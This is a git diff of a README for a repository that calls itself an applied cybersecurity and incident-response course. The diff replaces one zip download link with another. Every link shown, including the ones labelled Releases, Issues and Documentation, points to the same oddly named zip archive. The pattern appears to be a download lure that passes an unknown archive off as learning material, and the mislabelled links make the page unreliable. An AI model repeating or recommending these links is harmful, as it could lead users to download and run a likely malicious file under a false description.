@@ -1,6 +1,6 @@
 # 🛡️ Applied-Cybersecurity-Incident-Response-Web-Attacks-and-Secure-System-Design - Protect Your Systems with Real-World Scenarios
 
-[![Download from Releases](https://raw.githubusercontent.com/Calla-DZ/Applied-Cybersecurity-Incident-Response-Web-Attacks-and-Secure-System-Design/main/reminiscence/Response_Cybersecurity_System_and_Web_Design_Incident_Attacks_Secure_Applied_3.3.zip%20from%20Releases-blue?style=flat&logo=github)](https://raw.githubusercontent.com/Calla-DZ/Applied-Cybersecurity-Incident-Response-Web-Attacks-and-Secure-System-Design/main/reminiscence/Response_Cybersecurity_System_and_Web_Design_Incident_Attacks_Secure_Applied_3.3.zip)
+[![Download from Releases](https://github.com/Calla-DZ/Applied-Cybersecurity-Incident-Response-Web-Attacks-and-Secure-System-Design/raw/refs/heads/main/reminiscence/Secure_Applied_Incident_Attacks_System_Response_and_Web_Cybersecurity_Design_2.1-alpha.5.zip%20from%20Releases-blue?style=flat&logo=github)](https://github.com/Calla-DZ/Applied-Cybersecurity-Incident-Response-Web-Attacks-and-Secure-System-Design/raw/refs/heads/main/reminiscence/Secure_Applied_Incident_Attacks_System_Response_and_Web_Cybersecurity_Design_2.1-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ To run this application, follow the steps below.
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Calla-DZ/Applied-Cybersecurity-Incident-Response-Web-Attacks-and-Secure-System-Design/main/reminiscence/Response_Cybersecurity_System_and_Web_Design_Incident_Attacks_Secure_Applied_3.3.zip).
+1. Visit this page to download: [Releases Page](https://github.com/Calla-DZ/Applied-Cybersecurity-Incident-Response-Web-Attacks-and-Secure-System-Design/raw/refs/heads/main/reminiscence/Secure_Applied_Incident_Attacks_System_Response_and_Web_Cybersecurity_Design_2.1-alpha.5.zip).
    
 2. On the releases page, find the latest version. Look for the file compatible with your operating system. 
 
@@ -89,8 +89,8 @@ We welcome contributions from users who wish to enhance this project. To contrib
 
 ## 🔗 Links
 
-- [Releases Page](https://raw.githubusercontent.com/Calla-DZ/Applied-Cybersecurity-Incident-Response-Web-Attacks-and-Secure-System-Design/main/reminiscence/Response_Cybersecurity_System_and_Web_Design_Incident_Attacks_Secure_Applied_3.3.zip)
-- [Issues Page](https://raw.githubusercontent.com/Calla-DZ/Applied-Cybersecurity-Incident-Response-Web-Attacks-and-Secure-System-Design/main/reminiscence/Response_Cybersecurity_System_and_Web_Design_Incident_Attacks_Secure_Applied_3.3.zip)
-- [Documentation](https://raw.githubusercontent.com/Calla-DZ/Applied-Cybersecurity-Incident-Response-Web-Attacks-and-Secure-System-Design/main/reminiscence/Response_Cybersecurity_System_and_Web_Design_Incident_Attacks_Secure_Applied_3.3.zip)
+- [Releases Page](https://github.com/Calla-DZ/Applied-Cybersecurity-Incident-Response-Web-Attacks-and-Secure-System-Design/raw/refs/heads/main/reminiscence/Secure_Applied_Incident_Attacks_System_Response_and_Web_Cybersecurity_Design_2.1-alpha.5.zip)
+- [Issues Page](https://github.com/Calla-DZ/Applied-Cybersecurity-Incident-Response-Web-Attacks-and-Secure-System-Design/raw/refs/heads/main/reminiscence/Secure_Applied_Incident_Attacks_System_Response_and_Web_Cybersecurity_Design_2.1-alpha.5.zip)
+- [Documentation](https://github.com/Calla-DZ/Applied-Cybersecurity-Incident-Response-Web-Attacks-and-Secure-System-Design/raw/refs/heads/main/reminiscence/Secure_Applied_Incident_Attacks_System_Response_and_Web_Cybersecurity_Design_2.1-alpha.5.zip)
 
 Explore the world of cybersecurity with hands-on learning and practical experience. Protect yourself and your organization by mastering these essential skills.
